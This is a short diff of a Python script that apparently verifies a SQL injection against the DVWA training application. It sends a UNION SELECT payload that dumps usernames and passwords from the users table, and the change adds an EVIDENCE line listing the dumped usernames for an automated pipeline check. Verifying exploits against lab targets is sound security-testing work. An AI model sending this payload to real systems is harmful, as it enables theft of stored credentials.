@@ -16,11 +16,15 @@ s.post(B + '/security.php', data={'security': 'low', 'seclev_submit': 'Submit', 
 payload = f"1' UNION SELECT user, password FROM users-- -"
 r = s.get(B + f'/vulnerabilities/sqli/?id={payload}&Submit=Submit', timeout=15)
 # Check for all 5 DVWA users
-users_found = sum(1 for u in ['admin', 'gordonb', '1337', 'pablo', 'smithy'] if u in r.text.lower())
+users = [u for u in ['admin', 'gordonb', '1337', 'pablo', 'smithy'] if u in r.text.lower()]
+users_found = len(users)
 print(f"MARKER: {marker}")
 print(f"USERS_FOUND: {users_found}/5")
 print(f"STATUS: {r.status_code}")
 if users_found >= 5:
+    # Rule #49: signal-bearing evidence for the pipeline's gate — the
+    # actual dumped usernames, per-result target content.
+    print(f"EVIDENCE: UNION SELECT dumped database users: {', '.join(users)}")
     print(f"VERDICT: CONFIRMED")
 else:
     print(f"VERDICT: FAILED")
